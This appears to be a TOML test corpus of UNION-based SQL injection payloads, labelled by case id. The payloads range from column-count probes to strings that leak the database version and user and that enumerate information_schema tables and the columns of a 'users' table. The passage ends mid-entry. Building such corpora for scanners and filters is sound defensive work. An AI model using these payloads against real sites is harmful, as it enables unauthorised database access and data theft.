schema = 1
# UNION-based SQLi: leak data by appending UNION SELECT.

[[case]]
id = "union_select_null_3"
class = "sql"
payload = "' UNION SELECT NULL,NULL,NULL--"

[[case]]
id = "union_select_null_1"
class = "sql"
payload = "' UNION SELECT NULL--"

[[case]]
id = "union_select_null_5"
class = "sql"
payload = "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"

[[case]]
id = "union_all_select_null"
class = "sql"
payload = "' UNION ALL SELECT NULL,NULL--"

[[case]]
id = "union_select_int"
class = "sql"
payload = "' UNION SELECT 1,2,3--"

[[case]]
id = "union_select_str"
class = "sql"
payload = "' UNION SELECT 'a','b','c'--"

[[case]]
id = "union_select_version"
class = "sql"
payload = "' UNION SELECT @@version,NULL--"

[[case]]
id = "union_select_db_user"
class = "sql"
payload = "' UNION SELECT user(),database()--"

[[case]]
id = "union_select_information_schema"
class = "sql"
payload = "' UNION SELECT table_name,NULL FROM information_schema.tables--"

[[case]]
id = "union_select_columns"
class = "sql"
payload = "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"

[[case]]
id = "union_select_concat"
